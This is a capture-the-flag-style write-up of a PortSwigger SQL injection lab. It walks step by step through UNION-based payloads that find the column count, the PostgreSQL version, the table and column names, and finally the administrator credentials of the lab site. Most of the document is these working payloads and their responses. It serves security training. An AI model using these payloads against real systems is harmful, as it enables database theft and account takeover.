# SQLi Lab #5 Writeup

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

## Lab: SQL injection UNION attack, retrieving data from other tables

In this lab, Burp Suite will be used to find the administrator login credentials to the vulnerable website. 

After loading the lab, enable the Burp Suite proxy. Then turn on the intercept in Burp Suite and load the "Gifts" section of the vulnerable website. Burp Suite will then intercept that packet so it can be sent to the Repeater.

Now, the innards of the database can be examined through the use of some payloads.



<br>
Each payload will be entered right after the "gifts" part of the URL, as the categories field is what is vulnerable in this lab.

<br>

> Don't forget to 'ctrl u' or 'command u' in order to URL encode your paylod.



<br>

# 
### **1. Determine the number of columns with the following iterative payload process.**



```SQL
' order by 1--
```
This resulted in a 200 response code, meaning there is at least 1 column (*obviously, heh*).

<br>

```SQL
' order by 2--
```
200 status code

<br>

```SQL
' order by 3--
```
500 Internal Server Error

Because this was solved iteratively, the amount of columns is: 3 - 1 = 2.

<br>

> **Number of Data Columns = 2**

<br>

#

### **2. Determine the data types of the columns.**

<br>
Since both columns of data on the website are just text, the initial guess is that both columns are strings.

```SQL
' UNION select 'a', 'a'--
```
200 Status Code

Due to the 200 status code, both of the columns are strings. If there were an error, try different data types (1, 1.1, etc.) using 'NULL' as a place holder for the other column.

<br>

> **Both columns are strings.**

<br>

#

### **3. Find the the type and version of the database.**

I'll be using the following link as a cheat sheet.
https://portswigger.net/web-security/sql-injection/cheat-sheet


Microsoft Database Version Payload:
```SQL
' UNION SELECT @@version, NULL--
```
500 error, it is not a microsoft database.

<br> 

PostgreSQL Database Version Payload:
```SQL
' UNION SELECT version(), NULL--
```
200 status code; it is a postgreSQL database.

After looking into the 200 response, I can see that the version is the following:

```HTML
<th>
PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1) on
x86_64-pc-linux-gnu, compiled by gcc 
(Ubuntu 9.4.0-1ubuntu1~20041) 9.4.0, 64-bit
</th>
```
<br>

> **Database Type = PostgreSQL**

<br>

#

### **4. Now that the database type is known, find the table names within the database.**
The portswigger cheat sheet shows to use the following to try and info from postgreSQL databases.
```SQL
SELECT * FROM information_schema.tables
```
Instead of *, find the correct name by looking at postgreSQL's documentation. This can be found by googling "information_schema.tables postgreSQL".

In the following link the table names for postgreSQL are identified as 'table_name'.
https://www.postgresql.org/docs/current/infoschema-columns.html

<br>

Therefore, the two column payload is:
```SQL
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
200 status code

In the 200 response, 'users' can be identified as one of the table names. This can be searched in the bottom search bar in Burp Suite repeater to keep from having to look through the whole response.

```HTML
<th>
users
</th>    
```
<br>

> **Table name = users**

<br>

#

### **5. Find the column names of the table name 'users'.**

Using the portswigger cheat sheet, the payload will look something like this:
```SQL
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
Instead of *, the postgreSQL website shows that the name of columns is column_name. 
```SQL
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--
```
200 status code

Two of the columns in the response are named password and username. 

<br>

> **Column Names = Username, Password**

<br>

#

### **6. Now that the table and columns are known, call them using a standard UNION injection.**

```SQL
' UNION select username, password FROM users--
```
200 status code

The final injection gives the administrator password and username displayed in the response.
```HTML
                           <th>administrator</th>
                            <td>787wo1nrar3t43x9pcko</td>
```

<br>

> **Username = administrator** 

> **Password = 787wo1nrar3t43x9pcko** 

<br>

#

### **7. Return to the login page of the vulnerable website and login with that information.**


<br>

### Congratulations! The lab has been solved!


